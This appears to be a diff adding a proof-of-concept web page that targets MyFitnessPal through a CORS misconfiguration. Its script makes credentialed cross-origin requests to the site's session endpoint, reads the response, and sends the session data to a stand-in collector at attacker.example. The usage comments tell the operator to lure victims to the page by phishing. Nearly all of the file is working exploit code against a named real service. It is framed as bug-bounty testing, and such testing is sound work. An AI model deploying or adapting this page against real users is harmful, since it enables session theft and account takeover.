@@ -1,0 +1,87 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>MyFitnessPal CORS PoC</title></head>
+<body>
+<h3>MyFitnessPal CORS PoC</h3>
+<div id="log" style="white-space:pre-wrap;border:1px solid #ddd;padding:10px"></div>
+
+<script>
+const logEl = document.getElementById('log');
+function log(...args){ logEl.textContent += args.join(' ') + '\\n'; console.log(...args); }
+
+/*
+ Usage:
+ 1) Host this page at https://attacker.example
+ 2) Point victims to visit it (phishing / social engineering in scope of your test program)
+ 3) Ensure you control https://attacker.example/collect to receive exfiltrated data (or change the URL below)
+*/
+
+const COLLECTOR = 'https://attacker.example/collect'; // change to your collector
+const SESSION_EP = 'https://www.myfitnesspal.com/api/auth/session';
+const REFLECT_EP = 'https://www.myfitnesspal.com/cdn-cgi/rum?'; // endpoint that reflected Origin in your tests
+
+async function tryFetch(url){
+  try{
+    const r = await fetch(url, { method: 'POST', credentials: 'include', mode: 'cors', body: '{}' });
+    log('fetch', url, '=>', r.status);
+    const headers = {};
+    for(const [k,v] of r.headers.entries()) headers[k.toLowerCase()] = v;
+    log('response headers:', JSON.stringify(headers, null, 2));
+    return {ok: r.ok, status: r.status, headers};
+  }catch(e){
+    log('fetch error', url, e);
+    return {ok:false, error: String(e)};
+  }
+}
+
+async function tryGetSession(){
+  try{
+    const r = await fetch(SESSION_EP, { method: 'GET', credentials: 'include', mode: 'cors' });
+    log('GET session status', r.status);
+    // try read body
+    const txt = await r.text();
+    log('session body length:', txt.length);
+    return {ok: r.ok, status: r.status, body: txt};
+  }catch(e){
+    log('GET session failed (likely CORS block):', String(e));
+    return {ok:false, error: String(e)};
+  }
+}
+
+async function exfiltrate(data){
+  try{
+    await fetch(COLLECTOR, {
+      method: 'POST',
+      mode: 'cors',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({poc: 'mfp-cors', data: btoa(data)})
+    });
+    log('exfiltrated to collector');
+  }catch(e){
+    log('exfiltrate failed:', String(e));
+  }
+}
+
+(async function(){
+  log('PoC start — checking reflective endpoint first (non-destructive)');
+  const r1 = await tryFetch(REFLECT_EP);
+  if(r1.headers){
+    log('Reflect headers seen:', r1.headers['access-control-allow-origin'], r1.headers['access-control-allow-credentials']);
+  }
+
+  log('\\nNow trying to GET /api/auth/session with credentials included');
+  const r2 = await tryGetSession();
+
+  if(r2.ok && r2.body && r2.body.length > 0){
+    log('SUCCESS: Able to read /api/auth/session body!');
+    log(r2.body);
+    // send to collector as proof
+    await exfiltrate(r2.body);
+  } else {
+    log('Could NOT read /api/auth/session via JS — likely CORS blocked.');
+    log('If reflective endpoint exists and returns Access-Control-Allow-Origin: YOUR_ORIGIN + Access-Control-Allow-Credentials: true, then re-run this from that origin or try other endpoints that reflect the Origin.');
+  }
+})();
+</script>
+</body>
+</html>
